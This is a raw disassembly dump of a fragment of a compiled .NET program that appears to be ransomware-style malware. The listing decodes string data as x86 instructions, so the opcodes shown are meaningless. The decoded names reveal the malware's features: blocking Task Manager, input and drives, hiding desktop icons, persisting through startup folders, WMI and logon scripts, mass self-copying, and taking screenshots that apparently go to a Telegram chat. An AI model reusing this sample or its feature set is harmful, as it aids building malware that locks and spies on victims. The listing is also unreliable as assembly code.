  405da0:	6e                   	outsb  %ds:(%esi),(%dx)
  405da1:	66 6f                	outsw  %ds:(%esi),(%dx)
  405da3:	00 53 79             	add    %dl,0x79(%ebx)
  405da6:	73 74                	jae    0x405e1c
  405da8:	65 6d                	gs insl (%dx),%es:(%edi)
  405daa:	50                   	push   %eax
  405dab:	61                   	popa
  405dac:	72 61                	jb     0x405e0f
  405dae:	6d                   	insl   (%dx),%es:(%edi)
  405daf:	65 74 65             	gs je  0x405e17
  405db2:	72 73                	jb     0x405e27
  405db4:	49                   	dec    %ecx
  405db5:	6e                   	outsb  %ds:(%esi),(%dx)
  405db6:	66 6f                	outsw  %ds:(%esi),(%dx)
  405db8:	00 50 72             	add    %dl,0x72(%eax)
  405dbb:	6f                   	outsl  %ds:(%esi),(%dx)
  405dbc:	63 65 73             	arpl   %esp,0x73(%ebp)
  405dbf:	73 53                	jae    0x405e14
  405dc1:	74 61                	je     0x405e24
  405dc3:	72 74                	jb     0x405e39
  405dc5:	49                   	dec    %ecx
  405dc6:	6e                   	outsb  %ds:(%esi),(%dx)
  405dc7:	66 6f                	outsw  %ds:(%esi),(%dx)
  405dc9:	00 42 69             	add    %al,0x69(%edx)
  405dcc:	74 6d                	je     0x405e3b
  405dce:	61                   	popa
  405dcf:	70 00                	jo     0x405dd1
  405dd1:	4d                   	dec    %ebp
  405dd2:	65 73 73             	gs jae 0x405e48
  405dd5:	61                   	popa
  405dd6:	67 65 42             	addr16 gs inc %edx
  405dd9:	65 65 70 00          	gs gs jo 0x405ddd
  405ddd:	53                   	push   %ebx
  405dde:	6c                   	insb   (%dx),%es:(%edi)
  405ddf:	65 65 70 00          	gs gs jo 0x405de3
  405de3:	43                   	inc    %ebx
  405de4:	72 65                	jb     0x405e4b
  405de6:	61                   	popa
  405de7:	74 65                	je     0x405e4e
  405de9:	57                   	push   %edi
  405dea:	4d                   	dec    %ebp
  405deb:	49                   	dec    %ecx
  405dec:	53                   	push   %ebx
  405ded:	74 61                	je     0x405e50
  405def:	72 74                	jb     0x405e65
  405df1:	75 70                	jne    0x405e63
  405df3:	00 53 79             	add    %dl,0x79(%ebx)
  405df6:	73 74                	jae    0x405e6c
  405df8:	65 6d                	gs insl (%dx),%es:(%edi)
  405dfa:	2e 4c                	cs dec %esp
  405dfc:	69 6e 71 00 3c 63 68 	imul   $0x68633c00,0x71(%esi),%ebp
  405e03:	61                   	popa
  405e04:	74 5f                	je     0x405e65
  405e06:	69 64 3e 6a 5f 5f 54 	imul   $0x50545f5f,0x6a(%esi,%edi,1),%esp
  405e0d:	50 
  405e0e:	61                   	popa
  405e0f:	72 00                	jb     0x405e11
  405e11:	3c 70                	cmp    $0x70,%al
  405e13:	61                   	popa
  405e14:	72 73                	jb     0x405e89
  405e16:	65 5f                	gs pop %edi
  405e18:	6d                   	insl   (%dx),%es:(%edi)
  405e19:	6f                   	outsl  %ds:(%esi),(%dx)
  405e1a:	64 65 3e 6a 5f       	fs gs ds push $0x5f
  405e1f:	5f                   	pop    %edi
  405e20:	54                   	push   %esp
  405e21:	50                   	push   %eax
  405e22:	61                   	popa
  405e23:	72 00                	jb     0x405e25
  405e25:	3c 74                	cmp    $0x74,%al
  405e27:	65 78 74             	gs js  0x405e9e
  405e2a:	3e 6a 5f             	ds push $0x5f
  405e2d:	5f                   	pop    %edi
  405e2e:	54                   	push   %esp
  405e2f:	50                   	push   %eax
  405e30:	61                   	popa
  405e31:	72 00                	jb     0x405e33
  405e33:	73 65                	jae    0x405e9a
  405e35:	74 5f                	je     0x405e96
  405e37:	53                   	push   %ebx
  405e38:	68 6f 77 49 6e       	push   $0x6e49776f
  405e3d:	54                   	push   %esp
  405e3e:	61                   	popa
  405e3f:	73 6b                	jae    0x405eac
  405e41:	62 61 72             	bound  %esp,0x72(%ecx)
  405e44:	00 43 6c             	add    %al,0x6c(%ebx)
  405e47:	65 61                	gs popa
  405e49:	72 00                	jb     0x405e4b
  405e4b:	48                   	dec    %eax
  405e4c:	74 74                	je     0x405ec2
  405e4e:	70 52                	jo     0x405ea2
  405e50:	65 71 75             	gs jno 0x405ec8
  405e53:	65 73 74             	gs jae 0x405eca
  405e56:	48                   	dec    %eax
  405e57:	65 61                	gs popa
  405e59:	64 65 72 00          	fs gs jb 0x405e5d
  405e5d:	49                   	dec    %ecx
  405e5e:	46                   	inc    %esi
  405e5f:	6f                   	outsl  %ds:(%esi),(%dx)
  405e60:	72 6d                	jb     0x405ecf
  405e62:	61                   	popa
  405e63:	74 50                	je     0x405eb5
  405e65:	72 6f                	jb     0x405ed6
  405e67:	76 69                	jbe    0x405ed2
  405e69:	64 65 72 00          	fs gs jb 0x405e6d
  405e6d:	53                   	push   %ebx
  405e6e:	70 65                	jo     0x405ed5
  405e70:	63 69 61             	arpl   %ebp,0x61(%ecx)
  405e73:	6c                   	insb   (%dx),%es:(%edi)
  405e74:	46                   	inc    %esi
  405e75:	6f                   	outsl  %ds:(%esi),(%dx)
  405e76:	6c                   	insb   (%dx),%es:(%edi)
  405e77:	64 65 72 00          	fs gs jb 0x405e7b
  405e7b:	43                   	inc    %ebx
  405e7c:	6f                   	outsl  %ds:(%esi),(%dx)
  405e7d:	70 79                	jo     0x405ef8
  405e7f:	54                   	push   %esp
  405e80:	6f                   	outsl  %ds:(%esi),(%dx)
  405e81:	53                   	push   %ebx
  405e82:	74 61                	je     0x405ee5
  405e84:	72 74                	jb     0x405efa
  405e86:	75 70                	jne    0x405ef8
  405e88:	46                   	inc    %esi
  405e89:	6f                   	outsl  %ds:(%esi),(%dx)
  405e8a:	6c                   	insb   (%dx),%es:(%edi)
  405e8b:	64 65 72 00          	fs gs jb 0x405e8f
  405e8f:	67 65 74 5f          	addr16 gs je 0x405ef2
  405e93:	52                   	push   %edx
  405e94:	65 73 6f             	gs jae 0x405f06
  405e97:	75 72                	jne    0x405f0b
  405e99:	63 65 4d             	arpl   %esp,0x4d(%ebp)
  405e9c:	61                   	popa
  405e9d:	6e                   	outsb  %ds:(%esi),(%dx)
  405e9e:	61                   	popa
  405e9f:	67 65 72 00          	addr16 gs jb 0x405ea3
  405ea3:	42                   	inc    %edx
  405ea4:	6c                   	insb   (%dx),%es:(%edi)
  405ea5:	6f                   	outsl  %ds:(%esi),(%dx)
  405ea6:	63 6b 54             	arpl   %ebp,0x54(%ebx)
  405ea9:	61                   	popa
  405eaa:	73 6b                	jae    0x405f17
  405eac:	4d                   	dec    %ebp
  405ead:	61                   	popa
  405eae:	6e                   	outsb  %ds:(%esi),(%dx)
  405eaf:	61                   	popa
  405eb0:	67 65 72 00          	addr16 gs jb 0x405eb4
  405eb4:	53                   	push   %ebx
  405eb5:	79 73                	jns    0x405f2a
  405eb7:	74 65                	je     0x405f1e
  405eb9:	6d                   	insl   (%dx),%es:(%edi)
  405eba:	2e 43                	cs inc %ebx
  405ebc:	6f                   	outsl  %ds:(%esi),(%dx)
  405ebd:	64 65 44             	fs gs inc %esp
  405ec0:	6f                   	outsl  %ds:(%esi),(%dx)
  405ec1:	6d                   	insl   (%dx),%es:(%edi)
  405ec2:	2e 43                	cs inc %ebx
  405ec4:	6f                   	outsl  %ds:(%esi),(%dx)
  405ec5:	6d                   	insl   (%dx),%es:(%edi)
  405ec6:	70 69                	jo     0x405f31
  405ec8:	6c                   	insb   (%dx),%es:(%edi)
  405ec9:	65 72 00             	gs jb  0x405ecc
  405ecc:	53                   	push   %ebx
  405ecd:	65 74 42             	gs je  0x405f12
  405ed0:	6c                   	insb   (%dx),%es:(%edi)
  405ed1:	61                   	popa
  405ed2:	63 6b 57             	arpl   %ebp,0x57(%ebx)
  405ed5:	61                   	popa
  405ed6:	6c                   	insb   (%dx),%es:(%edi)
  405ed7:	6c                   	insb   (%dx),%es:(%edi)
  405ed8:	70 61                	jo     0x405f3b
  405eda:	70 65                	jo     0x405f41
  405edc:	72 00                	jb     0x405ede
  405ede:	43                   	inc    %ebx
  405edf:	75 72                	jne    0x405f53
  405ee1:	72 65                	jb     0x405f48
  405ee3:	6e                   	outsb  %ds:(%esi),(%dx)
  405ee4:	74 55                	je     0x405f3b
  405ee6:	73 65                	jae    0x405f4d
  405ee8:	72 00                	jb     0x405eea
  405eea:	73 65                	jae    0x405f51
  405eec:	74 5f                	je     0x405f4d
  405eee:	46                   	inc    %esi
  405eef:	6f                   	outsl  %ds:(%esi),(%dx)
  405ef0:	72 65                	jb     0x405f57
  405ef2:	43                   	inc    %ebx
  405ef3:	6f                   	outsl  %ds:(%esi),(%dx)
  405ef4:	6c                   	insb   (%dx),%es:(%edi)
  405ef5:	6f                   	outsl  %ds:(%esi),(%dx)
  405ef6:	72 00                	jb     0x405ef8
  405ef8:	73 65                	jae    0x405f5f
  405efa:	74 5f                	je     0x405f5b
  405efc:	42                   	inc    %edx
  405efd:	61                   	popa
  405efe:	63 6b 43             	arpl   %ebp,0x43(%ebx)
  405f01:	6f                   	outsl  %ds:(%esi),(%dx)
  405f02:	6c                   	insb   (%dx),%es:(%edi)
  405f03:	6f                   	outsl  %ds:(%esi),(%dx)
  405f04:	72 00                	jb     0x405f06
  405f06:	53                   	push   %ebx
  405f07:	68 6f 77 43 75       	push   $0x7543776f
  405f0c:	72 73                	jb     0x405f81
  405f0e:	6f                   	outsl  %ds:(%esi),(%dx)
  405f0f:	72 00                	jb     0x405f11
  405f11:	47                   	inc    %edi
  405f12:	65 74 45             	gs je  0x405f5a
  405f15:	6e                   	outsb  %ds:(%esi),(%dx)
  405f16:	75 6d                	jne    0x405f85
  405f18:	65 72 61             	gs jb  0x405f7c
  405f1b:	74 6f                	je     0x405f8c
  405f1d:	72 00                	jb     0x405f1f
  405f1f:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  405f24:	00 2e                	add    %ch,(%esi)
  405f26:	63 63 74             	arpl   %esp,0x74(%ebx)
  405f29:	6f                   	outsl  %ds:(%esi),(%dx)
  405f2a:	72 00                	jb     0x405f2c
  405f2c:	47                   	inc    %edi
  405f2d:	72 61                	jb     0x405f90
  405f2f:	70 68                	jo     0x405f99
  405f31:	69 63 73 00 53 79 73 	imul   $0x73795300,0x73(%ebx),%esp
  405f38:	74 65                	je     0x405f9f
  405f3a:	6d                   	insl   (%dx),%es:(%edi)
  405f3b:	2e 44                	cs inc %esp
  405f3d:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  405f44:	69 63 73 00 67 65 74 	imul   $0x74656700,0x73(%ebx),%esp
  405f4b:	5f                   	pop    %edi
  405f4c:	42                   	inc    %edx
  405f4d:	6f                   	outsl  %ds:(%esi),(%dx)
  405f4e:	75 6e                	jne    0x405fbe
  405f50:	64 73 00             	fs jae 0x405f53
  405f53:	57                   	push   %edi
  405f54:	65 62 52 65          	bound  %edx,%gs:0x65(%edx)
  405f58:	71 75                	jno    0x405fcf
  405f5a:	65 73 74             	gs jae 0x405fd1
  405f5d:	4d                   	dec    %ebp
  405f5e:	65 74 68             	gs je  0x405fc9
  405f61:	6f                   	outsl  %ds:(%esi),(%dx)
  405f62:	64 73 00             	fs jae 0x405f65
  405f65:	53                   	push   %ebx
  405f66:	79 73                	jns    0x405fdb
  405f68:	74 65                	je     0x405fcf
  405f6a:	6d                   	insl   (%dx),%es:(%edi)
  405f6b:	2e 52                	cs push %edx
  405f6d:	75 6e                	jne    0x405fdd
  405f6f:	74 69                	je     0x405fda
  405f71:	6d                   	insl   (%dx),%es:(%edi)
  405f72:	65 2e 49             	gs cs dec %ecx
  405f75:	6e                   	outsb  %ds:(%esi),(%dx)
  405f76:	74 65                	je     0x405fdd
  405f78:	72 6f                	jb     0x405fe9
  405f7a:	70 53                	jo     0x405fcf
  405f7c:	65 72 76             	gs jb  0x405ff5
  405f7f:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  405f86:	73 74                	jae    0x405ffc
  405f88:	65 6d                	gs insl (%dx),%es:(%edi)
  405f8a:	2e 52                	cs push %edx
  405f8c:	75 6e                	jne    0x405ffc
  405f8e:	74 69                	je     0x405ff9
  405f90:	6d                   	insl   (%dx),%es:(%edi)
  405f91:	65 2e 43             	gs cs inc %ebx
  405f94:	6f                   	outsl  %ds:(%esi),(%dx)
  405f95:	6d                   	insl   (%dx),%es:(%edi)
  405f96:	70 69                	jo     0x406001
  405f98:	6c                   	insb   (%dx),%es:(%edi)
  405f99:	65 72 53             	gs jb  0x405fef
  405f9c:	65 72 76             	gs jb  0x406015
  405f9f:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  405fa6:	73 74                	jae    0x40601c
  405fa8:	65 6d                	gs insl (%dx),%es:(%edi)
  405faa:	2e 52                	cs push %edx
  405fac:	65 73 6f             	gs jae 0x40601e
  405faf:	75 72                	jne    0x406023
  405fb1:	63 65 73             	arpl   %esp,0x73(%ebp)
  405fb4:	00 52 61             	add    %dl,0x61(%edx)
  405fb7:	6e                   	outsb  %ds:(%esi),(%dx)
  405fb8:	73 6f                	jae    0x406029
  405fba:	6d                   	insl   (%dx),%es:(%edi)
  405fbb:	57                   	push   %edi
  405fbc:	61                   	popa
  405fbd:	72 65                	jb     0x406024
  405fbf:	2e 50                	cs push %eax
  405fc1:	72 6f                	jb     0x406032
  405fc3:	70 65                	jo     0x40602a
  405fc5:	72 74                	jb     0x40603b
  405fc7:	69 65 73 2e 52 65 73 	imul   $0x7365522e,0x73(%ebp),%esp
  405fce:	6f                   	outsl  %ds:(%esi),(%dx)
  405fcf:	75 72                	jne    0x406043
  405fd1:	63 65 73             	arpl   %esp,0x73(%ebp)
  405fd4:	2e 72 65             	jb,pn  0x40603c
  405fd7:	73 6f                	jae    0x406048
  405fd9:	75 72                	jne    0x40604d
  405fdb:	63 65 73             	arpl   %esp,0x73(%ebp)
  405fde:	00 44 65 62          	add    %al,0x62(%ebp,%eiz,2)
  405fe2:	75 67                	jne    0x40604b
  405fe4:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  405feb:	65 
  405fec:	73 00                	jae    0x405fee
  405fee:	43                   	inc    %ebx
  405fef:	72 65                	jb     0x406056
  405ff1:	61                   	popa
  405ff2:	74 65                	je     0x406059
  405ff4:	54                   	push   %esp
  405ff5:	68 6f 75 73 61       	push   $0x6173756f
  405ffa:	6e                   	outsb  %ds:(%esi),(%dx)
  405ffb:	64 73 43             	fs jae 0x406041
  405ffe:	6f                   	outsl  %ds:(%esi),(%dx)
  405fff:	70 69                	jo     0x40606a
  406001:	65 73 00             	gs jae 0x406004
  406004:	52                   	push   %edx
  406005:	61                   	popa
  406006:	6e                   	outsb  %ds:(%esi),(%dx)
  406007:	73 6f                	jae    0x406078
  406009:	6d                   	insl   (%dx),%es:(%edi)
  40600a:	57                   	push   %edi
  40600b:	61                   	popa
  40600c:	72 65                	jb     0x406073
  40600e:	2e 50                	cs push %eax
  406010:	72 6f                	jb     0x406081
  406012:	70 65                	jo     0x406079
  406014:	72 74                	jb     0x40608a
  406016:	69 65 73 00 45 6e 61 	imul   $0x616e4500,0x73(%ebp),%esp
  40601d:	62 6c 65 56          	bound  %ebp,0x56(%ebp,%eiz,2)
  406021:	69 73 75 61 6c 53 74 	imul   $0x74536c61,0x75(%ebx),%esi
  406028:	79 6c                	jns    0x406096
  40602a:	65 73 00             	gs jae 0x40602d
  40602d:	46                   	inc    %esi
  40602e:	69 6c 65 41 74 74 72 	imul   $0x69727474,0x41(%ebp,%eiz,2),%ebp
  406035:	69 
  406036:	62 75 74             	bound  %esi,0x74(%ebp)
  406039:	65 73 00             	gs jae 0x40603c
  40603c:	53                   	push   %ebx
  40603d:	65 74 41             	gs je  0x406081
  406040:	74 74                	je     0x4060b6
  406042:	72 69                	jb     0x4060ad
  406044:	62 75 74             	bound  %esi,0x74(%ebp)
  406047:	65 73 00             	gs jae 0x40604a
  40604a:	52                   	push   %edx
  40604b:	65 61                	gs popa
  40604d:	64 41                	fs inc %ecx
  40604f:	6c                   	insb   (%dx),%es:(%edi)
  406050:	6c                   	insb   (%dx),%es:(%edi)
  406051:	42                   	inc    %edx
  406052:	79 74                	jns    0x4060c8
  406054:	65 73 00             	gs jae 0x406057
  406057:	47                   	inc    %edi
  406058:	65 74 42             	gs je  0x40609d
  40605b:	79 74                	jns    0x4060d1
  40605d:	65 73 00             	gs jae 0x406060
  406060:	47                   	inc    %edi
  406061:	65 74 4c             	gs je  0x4060b0
  406064:	6f                   	outsl  %ds:(%esi),(%dx)
  406065:	67 69 63 61 6c 44 72 	imul   $0x6972446c,0x61(%bp,%di),%esp
  40606c:	69 
  40606d:	76 65                	jbe    0x4060d4
  40606f:	73 00                	jae    0x406071
  406071:	53                   	push   %ebx
  406072:	65 74 74             	gs je  0x4060e9
  406075:	69 6e 67 73 00 67 65 	imul   $0x65670073,0x67(%esi),%ebp
  40607c:	74 5f                	je     0x4060dd
  40607e:	54                   	push   %esp
  40607f:	69 63 6b 73 00 53 79 	imul   $0x79530073,0x6b(%ebx),%esp
  406086:	73 74                	jae    0x4060fc
  406088:	65 6d                	gs insl (%dx),%es:(%edi)
  40608a:	2e 54                	cs push %esp
  40608c:	68 72 65 61 64       	push   $0x64616572
  406091:	69 6e 67 2e 54 61 73 	imul   $0x7361542e,0x67(%esi),%ebp
  406098:	6b 73 00 45          	imul   $0x45,0x0(%ebx),%esi
  40609c:	71 75                	jno    0x406113
  40609e:	61                   	popa
  40609f:	6c                   	insb   (%dx),%es:(%edi)
  4060a0:	73 00                	jae    0x4060a2
  4060a2:	67 65 74 5f          	addr16 gs je 0x406105
  4060a6:	43                   	inc    %ebx
  4060a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4060a8:	6e                   	outsb  %ds:(%esi),(%dx)
  4060a9:	74 72                	je     0x40611d
  4060ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4060ac:	6c                   	insb   (%dx),%es:(%edi)
  4060ad:	73 00                	jae    0x4060af
  4060af:	53                   	push   %ebx
  4060b0:	79 73                	jns    0x406125
  4060b2:	74 65                	je     0x406119
  4060b4:	6d                   	insl   (%dx),%es:(%edi)
  4060b5:	2e 57                	cs push %edi
  4060b7:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  4060be:	46                   	inc    %esi
  4060bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4060c0:	72 6d                	jb     0x40612f
  4060c2:	73 00                	jae    0x4060c4
  4060c4:	43                   	inc    %ebx
  4060c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4060c6:	6e                   	outsb  %ds:(%esi),(%dx)
  4060c7:	74 61                	je     0x40612a
  4060c9:	69 6e 73 00 48 69 64 	imul   $0x64694800,0x73(%esi),%ebp
  4060d0:	65 44                	gs inc %esp
  4060d2:	65 73 6b             	gs jae 0x406140
  4060d5:	74 6f                	je     0x406146
  4060d7:	70 49                	jo     0x406122
  4060d9:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  4060dc:	73 00                	jae    0x4060de
  4060de:	41                   	inc    %ecx
  4060df:	64 64 54             	fs fs push %esp
  4060e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4060e3:	41                   	inc    %ecx
  4060e4:	4c                   	dec    %esp
  4060e5:	4c                   	dec    %esp
  4060e6:	53                   	push   %ebx
  4060e7:	74 61                	je     0x40614a
  4060e9:	72 74                	jb     0x40615f
  4060eb:	75 70                	jne    0x40615d
  4060ed:	4c                   	dec    %esp
  4060ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4060ef:	63 61 74             	arpl   %esp,0x74(%ecx)
  4060f2:	69 6f 6e 73 00 53 65 	imul   $0x65530073,0x6e(%edi),%ebp
  4060f9:	74 43                	je     0x40613e
  4060fb:	75 72                	jne    0x40616f
  4060fd:	73 6f                	jae    0x40616e
  4060ff:	72 50                	jb     0x406151
  406101:	6f                   	outsl  %ds:(%esi),(%dx)
  406102:	73 00                	jae    0x406104
  406104:	67 65 74 5f          	addr16 gs je 0x406167
  406108:	43                   	inc    %ebx
  406109:	68 61 72 73 00       	push   $0x737261
  40610e:	67 65 74 5f          	addr16 gs je 0x406171
  406112:	48                   	dec    %eax
  406113:	65 61                	gs popa
  406115:	64 65 72 73          	fs gs jb 0x40618c
  406119:	00 42 6c             	add    %al,0x6c(%edx)
  40611c:	6f                   	outsl  %ds:(%esi),(%dx)
  40611d:	63 6b 44             	arpl   %ebp,0x44(%ebx)
  406120:	72 69                	jb     0x40618b
  406122:	76 65                	jbe    0x406189
  406124:	41                   	inc    %ecx
  406125:	63 63 65             	arpl   %esp,0x65(%ebx)
  406128:	73 73                	jae    0x40619d
  40612a:	00 50 72             	add    %dl,0x72(%eax)
  40612d:	6f                   	outsl  %ds:(%esi),(%dx)
  40612e:	63 65 73             	arpl   %esp,0x73(%ebp)
  406131:	73 00                	jae    0x406133
  406133:	73 65                	jae    0x40619a
  406135:	74 5f                	je     0x406196
  406137:	41                   	inc    %ecx
  406138:	72 67                	jb     0x4061a1
  40613a:	75 6d                	jne    0x4061a9
  40613c:	65 6e                	outsb  %gs:(%esi),(%dx)
  40613e:	74 73                	je     0x4061b3
  406140:	00 45 78             	add    %al,0x78(%ebp)
  406143:	69 73 74 73 00 53 75 	imul   $0x75530073,0x74(%ebx),%esi
  40614a:	70 65                	jo     0x4061b1
  40614c:	72 56                	jb     0x4061a4
  40614e:	69 72 75 73 00 66 42 	imul   $0x42660073,0x75(%edx),%esi
  406155:	6c                   	insb   (%dx),%es:(%edi)
  406156:	6f                   	outsl  %ds:(%esi),(%dx)
  406157:	63 6b 49             	arpl   %ebp,0x49(%ebx)
  40615a:	74 00                	je     0x40615c
  40615c:	43                   	inc    %ebx
  40615d:	6f                   	outsl  %ds:(%esi),(%dx)
  40615e:	6e                   	outsb  %ds:(%esi),(%dx)
  40615f:	63 61 74             	arpl   %esp,0x74(%ecx)
  406162:	00 52 65             	add    %dl,0x65(%edx)
  406165:	70 65                	jo     0x4061cc
  406167:	61                   	popa
  406168:	74 00                	je     0x40616a
  40616a:	49                   	dec    %ecx
  40616b:	6d                   	insl   (%dx),%es:(%edi)
  40616c:	61                   	popa
  40616d:	67 65 46             	addr16 gs inc %esi
  406170:	6f                   	outsl  %ds:(%esi),(%dx)
  406171:	72 6d                	jb     0x4061e0
  406173:	61                   	popa
  406174:	74 00                	je     0x406176
  406176:	4f                   	dec    %edi
  406177:	62 6a 65             	bound  %ebp,0x65(%edx)
  40617a:	63 74 00 53          	arpl   %esi,0x53(%eax,%eax,1)
  40617e:	65 6c                	gs insb (%dx),%es:(%edi)
  406180:	65 63 74 00 53       	arpl   %esi,%gs:0x53(%eax,%eax,1)
  406185:	79 73                	jns    0x4061fa
  406187:	74 65                	je     0x4061ee
  406189:	6d                   	insl   (%dx),%es:(%edi)
  40618a:	2e 4e                	cs dec %esi
  40618c:	65 74 00             	gs je  0x40618f
  40618f:	67 65 74 5f          	addr16 gs je 0x4061f2
  406193:	48                   	dec    %eax
  406194:	65 69 67 68 74 00 67 	imul   $0x65670074,%gs:0x68(%edi),%esp
  40619b:	65 
  40619c:	74 5f                	je     0x4061fd
  40619e:	44                   	inc    %esp
  40619f:	65 66 61             	gs popaw
  4061a2:	75 6c                	jne    0x406210
  4061a4:	74 00                	je     0x4061a6
  4061a6:	53                   	push   %ebx
  4061a7:	65 74 43             	gs je  0x4061ed
  4061aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4061ab:	6d                   	insl   (%dx),%es:(%edi)
  4061ac:	70 61                	jo     0x40620f
  4061ae:	74 69                	je     0x406219
  4061b0:	62 6c 65 54          	bound  %ebp,0x54(%ebp,%eiz,2)
  4061b4:	65 78 74             	gs js  0x40622b
  4061b7:	52                   	push   %edx
  4061b8:	65 6e                	outsb  %gs:(%esi),(%dx)
  4061ba:	64 65 72 69          	fs gs jb 0x406227
  4061be:	6e                   	outsb  %ds:(%esi),(%dx)
  4061bf:	67 44                	addr16 inc %esp
  4061c1:	65 66 61             	gs popaw
  4061c4:	75 6c                	jne    0x406232
  4061c6:	74 00                	je     0x4061c8
  4061c8:	44                   	inc    %esp
  4061c9:	69 61 6c 6f 67 52 65 	imul   $0x6552676f,0x6c(%ecx),%esp
  4061d0:	73 75                	jae    0x406247
  4061d2:	6c                   	insb   (%dx),%es:(%edi)
  4061d3:	74 00                	je     0x4061d5
  4061d5:	57                   	push   %edi
  4061d6:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  4061da:	69 65 6e 74 00 43 6f 	imul   $0x6f430074,0x6e(%ebp),%esp
  4061e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4061e2:	74 65                	je     0x406249
  4061e4:	6e                   	outsb  %ds:(%esi),(%dx)
  4061e5:	74 41                	je     0x406228
  4061e7:	6c                   	insb   (%dx),%es:(%edi)
  4061e8:	69 67 6e 6d 65 6e 74 	imul   $0x746e656d,0x6e(%edi),%esp
  4061ef:	00 45 6e             	add    %al,0x6e(%ebp)
  4061f2:	76 69                	jbe    0x40625d
  4061f4:	72 6f                	jb     0x406265
  4061f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4061f7:	6d                   	insl   (%dx),%es:(%edi)
  4061f8:	65 6e                	outsb  %gs:(%esi),(%dx)
  4061fa:	74 00                	je     0x4061fc
  4061fc:	67 65 74 5f          	addr16 gs je 0x40625f
  406200:	43                   	inc    %ebx
  406201:	75 72                	jne    0x406275
  406203:	72 65                	jb     0x40626a
  406205:	6e                   	outsb  %ds:(%esi),(%dx)
  406206:	74 00                	je     0x406208
  406208:	73 65                	jae    0x40626f
  40620a:	74 5f                	je     0x40626b
  40620c:	46                   	inc    %esi
  40620d:	6f                   	outsl  %ds:(%esi),(%dx)
  40620e:	6e                   	outsb  %ds:(%esi),(%dx)
  40620f:	74 00                	je     0x406211
  406211:	54                   	push   %esp
  406212:	61                   	popa
  406213:	6b 65 41 6e          	imul   $0x6e,0x41(%ebp),%esp
  406217:	64 53                	fs push %ebx
  406219:	65 6e                	outsb  %gs:(%esi),(%dx)
  40621b:	64 53                	fs push %ebx
  40621d:	63 72 65             	arpl   %esi,0x65(%edx)
  406220:	65 6e                	outsb  %gs:(%esi),(%dx)
  406222:	73 68                	jae    0x40628c
  406224:	6f                   	outsl  %ds:(%esi),(%dx)
  406225:	74 00                	je     0x406227
  406227:	41                   	inc    %ecx
  406228:	64 64 4c             	fs fs dec %esp
  40622b:	6f                   	outsl  %ds:(%esi),(%dx)
  40622c:	67 6f                	outsl  %ds:(%si),(%dx)
  40622e:	6e                   	outsb  %ds:(%esi),(%dx)
  40622f:	53                   	push   %ebx
  406230:	63 72 69             	arpl   %esi,0x69(%edx)
  406233:	70 74                	jo     0x4062a9
  406235:	00 54 68 72          	add    %dl,0x72(%eax,%ebp,2)
  406239:	65 61                	gs popa
  40623b:	64 53                	fs push %ebx
  40623d:	74 61                	je     0x4062a0
  40623f:	72 74                	jb     0x4062b5
  406241:	00 73 65             	add    %dh,0x65(%ebx)
  406244:	74 5f                	je     0x4062a5
  406246:	54                   	push   %esp
  406247:	6f                   	outsl  %ds:(%esi),(%dx)
  406248:	70 4d                	jo     0x406297
  40624a:	6f                   	outsl  %ds:(%esi),(%dx)
  40624b:	73 74                	jae    0x4062c1
  40624d:	00 42 6c             	add    %al,0x6c(%edx)
  406250:	6f                   	outsl  %ds:(%esi),(%dx)
  406251:	63 6b 49             	arpl   %ebp,0x49(%ebx)
  406254:	6e                   	outsb  %ds:(%esi),(%dx)
  406255:	70 75                	jo     0x4062cc
  406257:	74 00                	je     0x406259
  406259:	4d                   	dec    %ebp
  40625a:	6f                   	outsl  %ds:(%esi),(%dx)
  40625b:	76 65                	jbe    0x4062c2
  40625d:	4e                   	dec    %esi
  40625e:	65 78 74             	gs js  0x4062d5
  406261:	00 53 79             	add    %dl,0x79(%ebx)
  406264:	73 74                	jae    0x4062da
  406266:	65 6d                	gs insl (%dx),%es:(%edi)
  406268:	2e 54                	cs push %esp
  40626a:	65 78 74             	gs js  0x4062e1
  40626d:	00 73 65             	add    %dh,0x65(%ebx)
  406270:	74 5f                	je     0x4062d1
  406272:	54                   	push   %esp
  406273:	65 78 74             	gs js  0x4062ea
  406276:	00 52 65             	add    %dl,0x65(%edx)
  406279:	61                   	popa
  40627a:	64 41                	fs inc %ecx
  40627c:	6c                   	insb   (%dx),%es:(%edi)
  40627d:	6c                   	insb   (%dx),%es:(%edi)
  40627e:	54                   	push   %esp
  40627f:	65 78 74             	gs js  0x4062f6
  406282:	00 41 70             	add    %al,0x70(%ecx)
  406285:	70 65                	jo     0x4062ec
  406287:	6e                   	outsb  %ds:(%esi),(%dx)
  406288:	64 41                	fs inc %ecx
  40628a:	6c                   	insb   (%dx),%es:(%edi)
  40628b:	6c                   	insb   (%dx),%es:(%edi)
  40628c:	54                   	push   %esp
  40628d:	65 78 74             	gs js  0x406304
  406290:	00 57 72             	add    %dl,0x72(%edi)
  406293:	69 74 65 41 6c 6c 54 	imul   $0x65546c6c,0x41(%ebp,%eiz,2),%esi
  40629a:	65 
  40629b:	78 74                	js     0x406311
  40629d:	00 67 65             	add    %ah,0x65(%edi)
  4062a0:	74 5f                	je     0x406301
  4062a2:	74 65                	je     0x406309
  4062a4:	78 74                	js     0x40631a
  4062a6:	00 67 65             	add    %ah,0x65(%edi)
  4062a9:	74 5f                	je     0x40630a
  4062ab:	4e                   	dec    %esi
  4062ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4062ad:	77 00                	ja     0x4062af
  4062af:	47                   	inc    %edi
  4062b0:	65 74 43             	gs je  0x4062f6
  4062b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4062b4:	6e                   	outsb  %ds:(%esi),(%dx)
  4062b5:	73 6f                	jae    0x406326
